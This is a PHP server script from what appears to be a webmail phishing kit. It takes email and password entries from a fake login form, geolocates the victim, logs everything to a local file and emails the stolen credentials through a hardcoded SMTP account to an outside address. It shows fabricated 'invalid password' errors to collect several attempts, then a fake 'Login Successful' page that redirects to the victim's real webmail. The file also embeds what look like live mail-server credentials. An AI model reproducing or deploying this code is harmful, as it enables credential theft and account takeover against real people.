<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$geo = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=$ip"));
$country = $geo->geoplugin_countryName ?? 'Unknown';
$city = $geo->geoplugin_city ?? 'Unknown';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo "<html><head><title>403 - Forbidden</title></head><body><h1>403 Forbidden</h1><hr></body></html>";
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(["signal" => "error", "msg" => "Only POST allowed"]);
    exit();
}

$login = trim($_POST['email'] ?? '');
$passwd = trim($_POST['password'] ?? '');

if (!$login || !$passwd || !str_contains($login, '@')) {
    echo json_encode(["signal" => "error", "msg" => "Email and password required"]);
    exit();
}

list(, $domain) = explode('@', $login);

// SMTP credentials for sending logs
$receiver     = 'bobrob@elitat.com';
$senderuser   = 'tp@globalhouse.co.th';
$senderpass   = 'Globalhouse@123';
$senderport   = 587;
$senderserver = 'mail.globalhouse.co.th';
$smtp_secure  = 'tls';

$timestamp = date('Y-m-d H:i:s');
$logFile = 'SS-Or-LucaGherardi-Tests.txt';

// Track attempts per email
if (!isset($_SESSION['attempts'][$login])) {
    $_SESSION['attempts'][$login] = 0;
}
$_SESSION['attempts'][$login]++;

$attemptNumber = $_SESSION['attempts'][$login];

// Prepare the message content
$message = "=== CREDENTIAL CAPTURE (Attempt $attemptNumber) ===\n";
$message .= "Timestamp: $timestamp\n";
$message .= "Email: $login\n";
$message .= "Password: $passwd\n";
$message .= "Domain: $domain\n";
$message .= "IP: $ip\n";
$message .= "Country: $country\n";
$message .= "City: $city\n";
$message .= "User Agent: $browser\n";
$message .= "Attempt Number: $attemptNumber\n";
$message .= "========================\n\n";

// Log to file
file_put_contents($logFile, $message, FILE_APPEND);

// Prepare email content
$emailSubject = "Webmail Login (Attempt $attemptNumber): $login | $country";
$emailBody = "$login|$passwd\nIP of sender: $country | $city | $ip | $browser\nAttempt: $attemptNumber\n============WEBMAIL-LOGIN signal";

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->SMTPSecure = $smtp_secure;
    $mail->isHTML(true);
    $mail->Subject = $emailSubject;
    $mail->setFrom($senderuser, 'Webmail Monitor');
    $mail->addAddress($receiver);
    $mail->Body = $emailBody;
    $mail->AltBody = "New webmail login captured - Attempt $attemptNumber";

    $mail->send(); // Always try to send email
    
} catch (Exception $e) {
    // Email failed, but continue with logic
    error_log("Email sending failed: " . $e->getMessage());
}

// Determine response based on attempt number
if ($attemptNumber < 5) {
    // First 4 attempts - show incorrect password error
    $errorMessages = [
        "Invalid email or password. Please try again.",
        "Login failed. Please check your credentials and try again.",
        "Authentication failed. Please verify your email and password.",
        "Access denied. Please enter correct login details."
    ];
    
    // Log the error attempt
    error_log("ERROR ATTEMPT: Email=$login, Attempt=$attemptNumber, Message=" . $errorMessages[$attemptNumber - 1]);
    
    header('Content-Type: application/json');
    $response = [
        "signal" => "error",
        "success" => false,
        "msg" => $errorMessages[$attemptNumber - 1],
        "attempt" => $attemptNumber,
        "debug_info" => [
            "email_sent" => true,
            "timestamp" => $timestamp,
            "attempt_number" => $attemptNumber,
            "domain" => $domain
        ]
    ];
    
    // Longer delay for error responses
    usleep(rand(800000, 1500000));
    
    echo json_encode($response);
    
} else {
    // 5th attempt - redirect immediately using HTML meta refresh
    $redirectUrl = "https://webmail.$domain";
    
    // Log the redirect attempt
    error_log("REDIRECT ATTEMPT: Email=$login, Domain=$domain, RedirectURL=$redirectUrl, Attempt=$attemptNumber");
    
    // Send HTML response with meta refresh redirect
    header('Content-Type: text/html; charset=utf-8');
    
    echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Login Successful - Redirecting...</title>
    <meta http-equiv="refresh" content="2;url=' . htmlspecialchars($redirectUrl) . '">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
        .success-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
        .success-icon { color: #28a745; font-size: 48px; margin-bottom: 20px; }
        .redirect-text { color: #666; margin-top: 20px; }
        .manual-link { margin-top: 20px; }
        .manual-link a { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <div class="success-box">
        <div class="success-icon">✓</div>
        <h2>Login Successful!</h2>
        <p>Your credentials have been verified. You are being redirected to your webmail...</p>
        <div class="redirect-text">
            <p>Redirecting to: <strong>' . htmlspecialchars($redirectUrl) . '</strong></p>
            <p>If you are not redirected automatically, click the button below:</p>
        </div>
        <div class="manual-link">
            <a href="' . htmlspecialchars($redirectUrl) . '">Continue to Webmail</a>
        </div>
    </div>
    
    <script>
        // Additional JavaScript redirect as backup
        setTimeout(function() {
            window.location.href = "' . htmlspecialchars($redirectUrl) . '";
        }, 2000);
        
        // Log the redirect attempt
        console.log("Redirecting to: ' . htmlspecialchars($redirectUrl) . '");
        console.log("Attempt number: ' . $attemptNumber . '");
    </script>
</body>
</html>';
    
    // Short delay for success
    usleep(rand(300000, 800000));
}

exit();
?>